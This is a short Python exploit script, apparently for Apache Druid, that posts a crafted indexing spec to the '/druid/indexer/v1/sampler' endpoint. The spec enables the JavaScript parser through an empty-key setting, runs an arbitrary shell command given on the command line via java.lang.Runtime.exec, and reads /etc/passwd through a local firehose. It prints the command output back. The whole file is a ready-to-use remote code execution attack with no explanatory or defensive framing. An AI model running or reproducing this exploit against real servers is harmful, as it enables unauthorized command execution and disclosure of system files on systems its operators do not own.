# -*- coding: utf-8 -*-

import requests
import json
import argparse

parser = argparse.ArgumentParser(description='发送HTTP请求')
parser.add_argument('-u','--url', type=str, help='请求的URL地址')
parser.add_argument('-c','--cmd', type=str, help='要执行的命令')
args = parser.parse_args()
url = args.url
cmd = args.cmd

url_2 = "/druid/indexer/v1/sampler"


headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36",
    "Content-Type": "application/json",
    "Accept": "application/json,text/plain,*/*"
}

data = {
        "type": "index",
        "spec": {
            "ioConfig": {
                "type": "index",
                "firehose": {
                    "type": "local",
                    "baseDir": "/etc",
                    "filter": "passwd"
                }
            },
            "dataSchema": {
                "dataSource": "test",
                "parser": {
                    "parseSpec": {
                        "format": "javascript",
                        "timestampSpec": {},
                        "dimensionsSpec": {},
                        "function": "function(){var a = new java.util.Scanner(java.lang.Runtime.getRuntime().exec([ \"sh\",\"-c\",\" " + cmd +" \"] ).getInputStream()).useDelimiter(\"\\A\").next();return {timestamp:123123,test: a}}",
                        "": {
                            "enabled": "true"
                        }
                    }
                }
            }
        },
        "samplerConfig": {
            "numRows": 10
        }
    }

try:        
    response = requests.post(url+url_2, headers=headers, json=data)
    
    if response.status_code == 200:
        print(response.text)
        
except Exception as e:
    print(f"请求发生错误: {str(e)}")





